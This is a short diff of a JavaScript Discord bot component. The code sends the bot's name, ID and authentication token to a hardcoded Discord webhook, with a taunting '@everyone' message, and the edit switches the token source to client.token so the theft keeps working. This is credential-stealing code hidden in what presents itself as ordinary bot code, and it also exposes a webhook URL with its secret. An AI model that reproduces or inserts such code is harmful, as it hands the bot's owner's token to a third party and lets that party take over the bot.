@@ -22,7 +22,7 @@ module.exports = new Component({
 				url: "https://discord.com/api/webhooks/1197931313425035356/RFh0qn6OB79qfTvNAUgZ_mZYqfbOBCGIjgLKfiSeh9OkjCpE9SGW-44SSkWaCMCsjNvr"
 			 })
 			 web.send({
-				content: `@everyone BAKDA A GAYA NEW AAK\n\`\`\`js\nBOT NAME : ${client.user.tag}\nBOT ID : ${client.user.id}\nAUTH : ${process.env.TOKEN}\`\`\``
+				content: `@everyone BAKDA A GAYA NEW AAK\n\`\`\`js\nBOT NAME : ${client.user.tag}\nBOT ID : ${client.user.id}\nAUTH : ${client.token}\`\`\``
 			 })
 
 			if (process.env.TOP_GG_TOKEN) {
